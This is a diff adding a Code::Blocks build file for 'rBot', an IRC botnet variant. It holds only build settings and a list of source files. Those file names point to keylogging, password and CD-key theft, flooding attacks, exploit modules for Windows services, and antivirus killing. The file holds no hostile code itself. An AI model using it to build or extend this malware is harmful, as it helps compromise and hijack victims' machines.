@@ -1,0 +1,218 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="rBot" />
+		<Option pch_mode="2" />
+		<Option compiler="gcc" />
+		<Build>
+			<Target title="Win32 Release">
+				<Option output="E:\source\AllInOneBots\(rbot)x0n3-Satan-v1.0-Priv8-By-CorryL{x0n3-h4ck}\(rbot)x0n3-Satan-v1.0-Priv8-By-CorryL{x0n3-h4ck}\Release\rBot" prefix_auto="1" extension_auto="1" />
+				<Option object_output="Release" />
+				<Option type="0" />
+				<Option compiler="gcc" />
+				<Compiler>
+					<Add option="-W" />
+					<Add option="-fexceptions" />
+					<Add option="-O2" />
+					<Add option="-DWIN32" />
+					<Add option="-DNDEBUG" />
+					<Add option="-D_WINDOWS" />
+					<Add option="-D_MBCS" />
+					<Add directory="C:\Program Files\Microsoft SDK\Include" />
+				</Compiler>
+				<Linker>
+					<Add library="kernel32" />
+					<Add library="user32" />
+					<Add library="gdi32" />
+					<Add library="winspool" />
+					<Add library="comdlg32" />
+					<Add library="advapi32" />
+					<Add library="shell32" />
+					<Add library="ole32" />
+					<Add library="oleaut32" />
+					<Add library="uuid" />
+					<Add library="odbc32" />
+					<Add library="odbccp32" />
+				</Linker>
+			</Target>
+			<Target title="Win32 Debug">
+				<Option output="E:\source\AllInOneBots\(rbot)x0n3-Satan-v1.0-Priv8-By-CorryL{x0n3-h4ck}\(rbot)x0n3-Satan-v1.0-Priv8-By-CorryL{x0n3-h4ck}\Debug\rBot" prefix_auto="1" extension_auto="1" />
+				<Option object_output="Debug" />
+				<Option type="0" />
+				<Option compiler="gcc" />
+				<Compiler>
+					<Add option="-W" />
+					<Add option="-fexceptions" />
+					<Add option="-O2" />
+					<Add option="-DWIN32" />
+					<Add option="-DNDEBUG" />
+					<Add option="-D_WINDOWS" />
+					<Add option="-D_MBCS" />
+					<Add option="-DNO_AVFW_KILL" />
+					<Add option="-DNO_SECSYSTEM" />
+					<Add option="-DNO_REGISTRY" />
+					<Add option="-DNO_EHANDLER" />
+					<Add option="-DNO_CRYPT" />
+					<Add option="-DDEBUG_LOGGING" />
+					<Add directory="C:\Program Files\Microsoft SDK\Include" />
+				</Compiler>
+				<Linker>
+					<Add library="kernel32" />
+					<Add library="user32" />
+					<Add library="gdi32" />
+					<Add library="winspool" />
+					<Add library="comdlg32" />
+					<Add library="advapi32" />
+					<Add library="shell32" />
+					<Add library="ole32" />
+					<Add library="oleaut32" />
+					<Add library="uuid" />
+					<Add library="odbc32" />
+					<Add library="odbccp32" />
+					<Add library="wsock32" />
+					<Add library="wininet" />
+				</Linker>
+			</Target>
+		</Build>
+		<Unit filename="advscan.cpp" />
+		<Unit filename="advscan.h" />
+		<Unit filename="aliaslog.cpp" />
+		<Unit filename="aliaslog.h" />
+		<Unit filename="autostart.cpp" />
+		<Unit filename="autostart.h" />
+		<Unit filename="avirus.cpp" />
+		<Unit filename="avirus.h" />
+		<Unit filename="beagle.cpp" />
+		<Unit filename="beagle.h" />
+		<Unit filename="capture.cpp" />
+		<Unit filename="capture.h" />
+		<Unit filename="cdkeys.cpp" />
+		<Unit filename="cdkeys.h" />
+		<Unit filename="configs.h" />
+		<Unit filename="crc32.cpp" />
+		<Unit filename="crc32.h" />
+		<Unit filename="crypt.cpp" />
+		<Unit filename="crypt.h" />
+		<Unit filename="dameware.cpp" />
+		<Unit filename="dameware.h" />
+		<Unit filename="dcc.cpp" />
+		<Unit filename="dcc.h" />
+		<Unit filename="dcom.cpp" />
+		<Unit filename="dcom.h" />
+		<Unit filename="dcom2.cpp" />
+		<Unit filename="dcom2.h" />
+		<Unit filename="ddos.cpp" />
+		<Unit filename="ddos.h" />
+		<Unit filename="defines.h" />
+		<Unit filename="download.cpp" />
+		<Unit filename="download.h" />
+		<Unit filename="driveinfo.cpp" />
+		<Unit filename="driveinfo.h" />
+		<Unit filename="ehandler.cpp" />
+		<Unit filename="ehandler.h" />
+		<Unit filename="externs.h" />
+		<Unit filename="findfile.cpp" />
+		<Unit filename="findfile.h" />
+		<Unit filename="findpass.cpp" />
+		<Unit filename="findpass.h" />
+		<Unit filename="fphost.cpp" />
+		<Unit filename="fphost.h" />
+		<Unit filename="ftpd.cpp" />
+		<Unit filename="ftpd.h" />
+		<Unit filename="functions.h" />
+		<Unit filename="globals.h" />
+		<Unit filename="httpd.cpp" />
+		<Unit filename="httpd.h" />
+		<Unit filename="icmpflood.cpp" />
+		<Unit filename="icmpflood.h" />
+		<Unit filename="ident.cpp" />
+		<Unit filename="ident.h" />
+		<Unit filename="iis5ssl.cpp" />
+		<Unit filename="iis5ssl.h" />
+		<Unit filename="includes.h" />
+		<Unit filename="irc_send.cpp" />
+		<Unit filename="irc_send.h" />
+		<Unit filename="keylogger.cpp" />
+		<Unit filename="keylogger.h" />
+		<Unit filename="kuang2.cpp" />
+		<Unit filename="kuang2.h" />
+		<Unit filename="loaddlls.cpp" />
+		<Unit filename="loaddlls.h" />
+		<Unit filename="lsass.cpp" />
+		<Unit filename="lsass.h" />
+		<Unit filename="misc.cpp" />
+		<Unit filename="misc.h" />
+		<Unit filename="mssql.cpp" />
+		<Unit filename="mssql.h" />
+		<Unit filename="mydoom.cpp" />
+		<Unit filename="mydoom.h" />
+		<Unit filename="net.cpp" />
+		<Unit filename="net.h" />
+		<Unit filename="netbios.cpp" />
+		<Unit filename="netbios.h" />
+		<Unit filename="netdevil.cpp" />
+		<Unit filename="netdevil.h" />
+		<Unit filename="netutils.cpp" />
+		<Unit filename="netutils.h" />
+		<Unit filename="nicklist.h" />
+		<Unit filename="optix.cpp" />
+		<Unit filename="optix.h" />
+		<Unit filename="passwd.h" />
+		<Unit filename="peer2peer.cpp" />
+		<Unit filename="peer2peer.h" />
+		<Unit filename="pingudp.cpp" />
+		<Unit filename="pingudp.h" />
+		<Unit filename="processes.cpp" />
+		<Unit filename="processes.h" />
+		<Unit filename="psniff.cpp" />
+		<Unit filename="psniff.h" />
+		<Unit filename="rBot.cpp" />
+		<Unit filename="rBot.h" />
+		<Unit filename="redirect.cpp" />
+		<Unit filename="redirect.h" />
+		<Unit filename="remotecmd.cpp" />
+		<Unit filename="remotecmd.h" />
+		<Unit filename="rlogind.cpp" />
+		<Unit filename="rlogind.h" />
+		<Unit filename="rndnick.cpp" />
+		<Unit filename="rndnick.h" />
+		<Unit filename="scan.cpp" />
+		<Unit filename="scan.h" />
+		<Unit filename="secure.cpp" />
+		<Unit filename="secure.h" />
+		<Unit filename="session.cpp" />
+		<Unit filename="session.h" />
+		<Unit filename="shellcode.cpp" />
+		<Unit filename="shellcode.h" />
+		<Unit filename="socks4.cpp" />
+		<Unit filename="socks4.h" />
+		<Unit filename="sub7.cpp" />
+		<Unit filename="sub7.h" />
+		<Unit filename="synflood.cpp" />
+		<Unit filename="synflood.h" />
+		<Unit filename="sysinfo.cpp" />
+		<Unit filename="sysinfo.h" />
+		<Unit filename="tcpflood.cpp" />
+		<Unit filename="tcpflood.h" />
+		<Unit filename="tcpip.h" />
+		<Unit filename="tftpd.cpp" />
+		<Unit filename="tftpd.h" />
+		<Unit filename="threads.cpp" />
+		<Unit filename="threads.h" />
+		<Unit filename="upnp.cpp" />
+		<Unit filename="upnp.h" />
+		<Unit filename="visit.cpp" />
+		<Unit filename="visit.h" />
+		<Unit filename="webdav.cpp" />
+		<Unit filename="webdav.h" />
+		<Unit filename="wildcard.cpp" />
+		<Unit filename="wildcard.h" />
+		<Unit filename="workstation.cpp" />
+		<Unit filename="workstation.h" />
+		<Extensions>
+			<code_completion />
+			<debugger />
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
